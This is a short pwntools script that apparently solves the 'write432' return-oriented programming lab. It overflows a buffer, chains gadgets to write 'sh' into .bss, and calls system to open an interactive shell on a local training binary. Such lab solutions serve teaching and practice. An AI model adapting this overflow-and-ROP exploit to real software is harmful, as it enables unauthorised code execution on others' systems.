#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./write432")
sh = process("./write432")

system_plt = elf.plt["system"]
bss_addr = 0x0804A040
pop_edi_ebp = 0x080486da
mov_edi_ebp = 0x08048670

payload = ""
payload += "A"*44
payload += p32(pop_edi_ebp)
payload += p32(bss_addr)
payload += "sh\x00\x00"
payload += p32(mov_edi_ebp)
payload += p32(system_plt)
payload += "AAAA"
payload += p32(bss_addr)

sh.sendline(payload)
sh.interactive()